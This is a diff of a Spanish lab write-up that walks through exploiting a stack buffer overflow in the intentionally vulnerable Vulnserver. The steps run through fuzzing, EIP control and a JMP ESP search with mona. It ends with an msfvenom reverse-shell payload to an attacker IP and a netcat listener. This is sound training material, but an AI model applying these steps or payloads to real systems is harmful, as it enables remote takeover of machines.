@@ -1,7 +1,14 @@
-# M6T1_ExplotacionVanilla-Stack-Buffer-Overflow
-En esta tarea explotaremos una vulnerabilidad tipo Vanilla Stack Buffer Overflow, para continuar con la actividad se debe haber configurado un entorno de laboratiorio, podeis seguir la guia incluida en este repositorio.
+# M6T1 - Explotación Vanilla Stack Buffer Overflow
 
-## Ejecución Vulnserver
+En esta práctica se explota una vulnerabilidad de tipo **Vanilla Stack Buffer Overflow**.  
+Para su correcta realización es necesario haber configurado previamente el entorno de laboratorio.
+
+---
+
+
+## Consideraciones iniciales
+
+### Ejecución Vulnserver
 
 Nos posicionamos en el directorio indicado y ejecutamos:
 
@@ -11,14 +18,12 @@ vulnserver.exe
 
 <img width="1479" height="417" alt="image" src="https://github.com/user-attachments/assets/21ccfd29-e783-47cc-9dea-05c3019d231e" />
 
-Si todo es correcto, aparecerá un mensaje en la consola indicando que el servidor está en ejecución.
+Si todo es correcto, el servidor mostrará un mensaje indicando que está en ejecución.
 
 <img width="1304" height="248" alt="image" src="https://github.com/user-attachments/assets/8050c03a-878f-4a3d-a83d-aaedcbb6fa67" />
 
 
 ## Comprobación de la conexión
-
-Desde nuestra máquina Kali, comprobaremos la conectividad con el servicio **VulnServer** utilizando Netcat.
 
 #### Obtención de la dirección IP
 
@@ -90,17 +95,12 @@ El comando **TRUN** se considera un candidato potencial a vulnerabilidad de tipo
 
 Una vez identificado el comando TRUN como posible vector de ataque, se ha procedido a realizar fuzzing para comprobar su comportamiento ante entradas de gran tamaño.
 
-### Preparación del entorno
-
-Para llevar a cabo el fuzzing, se prepara el siguiente entorno:
-
 ### Máquina víctima (Windows 10)
 
-1. Levantar **Vulnserver**.
-2. Abrir **Immunity Debugger** con privilegios de administrador.
-3. Cargar el ejecutable:
+1. Abrir **Immunity Debugger** con privilegios de administrador.
+2. Cargar el ejecutable:
 ```File → Attach → vulnserver.exe```
-4. Clickar en el botón de play
+3. Por defecto se abre en pausa, debemos pulsar RUN.
 
 De esta forma, VulnServer queda en ejecución y monitorizado por el debugger.
 
@@ -118,7 +118,7 @@ Si el servidor responde con un banner, la conexión es correcta.
 
 ### Procedimiento
 
-Vamos a utilizar el script Python3Fuzzing.py, proporcionado por TheMalwareGuardian, este envía peticiones al comando TRUN incrementando progresivamente el tamaño del buffer.
+Vamos a utilizar el script **Python3Fuzzing.py**, proporcionado por TheMalwareGuardian, este envía peticiones al comando TRUN incrementando progresivamente el tamaño del buffer.
 
 El payload enviado sigue la estructura:
 
@@ -281,7 +281,7 @@ buffer = b'A' * 2006 + b'BBBB'
 
 ### Ejecución del script
 
-Se ha utilizado el script Python3ControlEIP.py proporcionado por TheMalwareGuardian para enviar el payload al servicio vulnerable:
+Se ha utilizado el script **Python3ControlEIP.py** proporcionado por TheMalwareGuardian para enviar el payload al servicio vulnerable:
 
 <img width="814" height="194" alt="image" src="https://github.com/user-attachments/assets/620dfd0f-7f5d-4a96-a4d4-59f97a77e77c" />
 
@@ -339,7 +339,7 @@ Esto genera este archivo:
 
 ### Ejecución del script
 
-Para la realización de este apartado utilizamos el script Python3FindBadChars.py proporcionado por TheMalwareGuardian:
+Para la realización de este apartado utilizamos el script **Python3FindBadChars.py** proporcionado por TheMalwareGuardian:
 
 <img width="1912" height="160" alt="image" src="https://github.com/user-attachments/assets/b456aa05-bae4-4be0-ac21-7e6508a9a68c" />
 
@@ -386,6 +386,81 @@ En primer lugar, se analizan los módulos cargados:
 !mona modules
 ```
 
+A partir del documento generado:
+
+<img width="1919" height="699" alt="image" src="https://github.com/user-attachments/assets/f2e17275-bb6d-4126-9a6d-4eef0cab8bd3" />
+
+Se selecciona un módulo adecuado, en este caso:
+
+```text
+essfunc.dll
+````
+- Sin ASLR (Address Space Layout Randomization)
+- Sin DEP (Data Execution Prevention)
+- Sin SafeSEH
+
+
+### Búsqueda de JMP ESP
+
+Una vez identificado el módulo, se busca la instrucción JMP ESP evitando bad characters (\x00):
+
+```bash
+!mona find -s "\xff\xe4" -m essfunc.dll -cpb "\x00"
+````
+
+<img width="1835" height="226" alt="image" src="https://github.com/user-attachments/assets/39dc5168-16a8-41fa-9251-ca568f79c558" />
+
+Elegímos la dirección:
+
+```text
+0x625011AF
+```
+
+### Ejecución script
+
+Ejecutamos el script **Python3JMPESP.py** proporcionado por TheMalwareGuardian, editando la dirección si fuera necesario.
+
+<img width="1919" height="999" alt="image" src="https://github.com/user-attachments/assets/c03aba88-82c8-411f-aac1-405881bb7c32" />
+
+Tras ejecutar el script, se observa que el registro EIP es sobrescrito con la dirección de una instrucción JMP ESP. Al ejecutar paso a paso, el flujo salta al stack, donde se encuentra el payload, confirmando el control total de ejecución al alcanzarse los breakpoints (INT3).
+
+## Integración del shellcode y explotación final
+
+Una vez conseguido el control total de la ejecución del programa, el siguiente paso consiste en integrar un shellcode funcional dentro del payload para lograr la ejecución remota de código.
+
+### Shellcode utilizado
+
+Se ha generado un shellcode mediante msfvenom, diseñado para establecer una conexión reversa hacia la máquina atacante.
+
+El shellcode ha sido generado excluyendo el bad character identificado (\x00) y utilizando codificación para garantizar su correcta ejecución.
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.137 LPORT=4444 EXITFUNC=thread -b "\x00" -f python
+````
+
+<img width="1081" height="672" alt="image" src="https://github.com/user-attachments/assets/854abb3f-3c8b-44f5-b63b-890fd62bc261" />
+
+
+### Ejeciución del script
+
+Ejecutamos el script **Python3Shellcode.py** agregando nuestro shellcode al script mientras ejecutamos:
+
+````bash
+sudo nc -nlvp 4444
+````
+
+### Resultado
+
+En la máquina atacante, mediante un listener (netcat), se recibe una conexión desde la máquina vulnerable, obteniendo acceso a una shell remota.
+
+<img width="676" height="186" alt="image" src="https://github.com/user-attachments/assets/93c4229e-a3ed-4706-9331-113092e0b20d" />
+
+
+### Conclusión
+
+Se ha conseguido la explotación completa de la vulnerabilidad de tipo buffer overflow, logrando la ejecución de código arbitrario mediante la integración de shellcode.
+
+Este paso demuestra el impacto real de la vulnerabilidad, permitiendo el control total del sistema afectado.
 
 
 
